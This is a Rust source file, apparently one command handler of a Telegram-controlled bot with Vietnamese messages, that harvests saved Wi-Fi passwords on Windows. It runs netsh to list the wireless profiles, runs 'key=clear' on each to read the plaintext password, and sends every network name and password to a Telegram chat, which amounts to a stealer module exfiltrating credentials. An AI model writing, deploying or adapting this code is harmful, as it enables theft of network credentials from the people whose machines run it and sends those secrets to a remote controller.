use anyhow::Result;
use teloxide::prelude::*;
use teloxide::types::{ChatId, MessageId};
use tokio::process::Command;

use crate::bot::md;

pub async fn wifi(bot: &Bot, chat_id: ChatId, reply_to: MessageId) -> Result<()> {
    let output = Command::new("netsh")
        .args(["wlan", "show", "profiles"])
        .output()
        .await?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    let mut profiles: Vec<String> = Vec::new();

    for line in stdout.lines() {
        if let Some(idx) = line.find(':') {
            let key = line[..idx].trim();
            if key == "All User Profile" || key == "User profile" {
                profiles.push(line[(idx + 1)..].trim().to_string());
            }
        }
    }

    if profiles.is_empty() {
        return md::send(bot, chat_id, reply_to, "ℹ️ Không tìm thấy WiFi đã lưu".to_string()).await;
    }

    let mut result = String::from("*📶 WiFi đã lưu:*\n\n");

    for profile in &profiles {
        let out = Command::new("netsh")
            .args(["wlan", "show", "profile", profile, "key=clear"])
            .output()
            .await;

        let password = match out {
            Ok(o) => {
                let s = String::from_utf8_lossy(&o.stdout);
                s.lines()
                    .find(|l| l.contains("Key Content"))
                    .and_then(|l| l.split(':').nth(1))
                    .map(|p| p.trim().to_string())
                    .unwrap_or_default()
            }
            Err(_) => String::new(),
        };

        if password.is_empty() {
            result.push_str(&format!("{} \\- _không có mật khẩu_\n", md::escape(profile)));
        } else {
            result.push_str(&format!("{} \\- {}\n", md::escape(profile), md::escape(&password)));
        }
    }

    md::send(bot, chat_id, reply_to, result).await
}
